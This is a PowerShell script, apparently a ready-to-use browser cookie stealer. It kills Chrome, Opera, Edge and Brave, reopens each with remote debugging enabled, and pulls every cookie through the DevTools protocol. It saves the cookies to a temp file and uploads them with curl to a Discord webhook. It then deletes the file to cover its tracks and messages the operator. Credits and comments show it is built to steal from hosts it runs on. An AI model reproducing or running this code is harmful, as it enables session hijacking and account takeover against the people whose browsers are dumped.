function quitx($browser) {
    $browser = [io.path]::GetFileNameWithoutExtension($browser)
    if (Get-Process -Name $browser -ErrorAction SilentlyContinue) {
        Stop-Process -Name $browser -Force
    }
}
# credits for this function: https://github.com/ScRiPt1337/PowerCookieMonster/blob/main/powerdump.ps1
function SendReceiveWebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message
    )

    try {
        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
        $CancellationToken = [System.Threading.CancellationToken]::None
        $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
        [void]$connectTask.Result
        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed. State: $($WebSocket.State)"
        }
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
        $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
        [void]$sendTask.Result
        $receivedData = New-Object System.Collections.Generic.List[byte]
        $ReceiveBuffer = New-Object byte[] 4096 # Adjust the buffer size as needed
        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)

        while ($true) {
            $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
            if ($receiveResult.Result.Count -gt 0) {
                $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
            }
            if ($receiveResult.Result.EndOfMessage) {
                break
            }
        }
        $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray())
        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)
        return $ReceivedMessage
    }
    catch {
        throw $_
    }
}

Function generateFileName {
    # Generate a random string using characters from the specified ranges
    $fileName = -join ((48..57) + (65..90) + (97..122) | ForEach-Object { [char]$_ } | Get-Random -Count 5)
    return $fileName
}

function dumpCookies($browser) {
    # opera.exe, chrome.exe, ecc....
    $ex = ".tmp"
    $tempPath = $Env:TEMP
    quitx($browser)
    try {        
        $process = Start-Process $browser -ArgumentList $URL  , "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort" # cookies don't get loeaded in headless mode, anyone know how to resolve this?
    }
    catch {
        $browserM = [io.path]::GetFileNameWithoutExtension($browser)
        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserM)
        $message = "The browser $browserM has not been found in the system (or maybe you have specified the wrong name)"
        sendMessage($message)
        return $null
    }
    $fileOut = generateFileName
    $fileOut = $fileOut + $ex
    $fullPath = $tempPath + "\" + $fileOut
    $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
    $jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
    $url_capture = $jsonData.webSocketDebuggerUrl
    $Message = '{"id": 1,"method":"Network.getAllCookies"}'

    if ($url_capture[0].Length -ge 2) {
        $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message 
        # Write to results.txt
        
        $response = $response -replace '^[^{]*', ''

        $response = $response -split "`n" | Where-Object { $_.Trim() -ne "" } | Out-String
        $json = $response | ConvertFrom-Json
        $json = sortCookies($json.result.cookies)
        try {
            $json | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullPath -Force
        }
        catch {
            $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
            sendMessage($message)
        }
        $browserM = [io.path]::GetFileNameWithoutExtension($browser)
        $browserM = (Get-Culture).TextInfo.ToTitleCase($browserM)
        $message = "Cookies from $browserM :"
        sendMessage($message)
        discordExfiltration -fileOut $fullPath # I had to call the function like this...otherwise it was not working (I mean discordExfiltration($json, $fileOut))
        # If there is any powershell expert out there that gonna help me with this issue I will be grateful (talk with me on Discord!)
      
        removeFile($fullPath)
        quitx($browser)
    
    } 

}


function sortCookies {
    param (
        $cookies
    )

    return $cookies | Sort-Object { $_.domain }
    
}

function discordExfiltration {
    param(
        $fileOut
    )
    try {
        # Path to your JSON file
        $jsonFilePath = $fileOut
        
        
        # Ensure the file exists before sending it
        if (Test-Path $jsonFilePath) {
            # Webhook URL (replace this with your actual URL)
            try {
                $curlCommand = "curl.exe -s -o null -X POST $hookUrl -F 'file=@$jsonFilePath' -H 'Content-Type: multipart/form-data'"
                Invoke-Expression $curlCommand
            }
            catch {
                $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
                sendMessage($message)
            }

            
        }
        else {
            $message = "The JSON file was not found. Please check the file path."
            sendMessage($message)
        }
    }
    catch {
        $message = "Error at line $($_.InvocationInfo.ScriptLineNumber)`nError message: $($_.Exception.Message)"
        sendMessage($message)
    }
    
}

function sendMessage {
    param(
        $message
    )
    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
}

function removeFile {
    param(
        $path
    )
    if (Test-Path $path) {

        Remove-Item -Path "$path" -Force
        $message = "Host system cleaned;)"
        sendMessage($message)

    }
    else {
        $message = "I was not able to clean the host system....What happened?"
        sendMessage($message)
    }
    
}

$remoteDebuggingPort = 9222 # port where debug mode will be opened
$URL = "https://www.chromestatus.com" # you can set any value you want, the result doesn't change
$hookUrl = "https://discord.com/api/webhooks/XXXXXXXXXXX" # CHANGE THIS


dumpCookies("chrome.exe")
dumpCookies("opera.exe")
dumpCookies("msedge.exe")
dumpCookies("brave.exe")
# Add others....
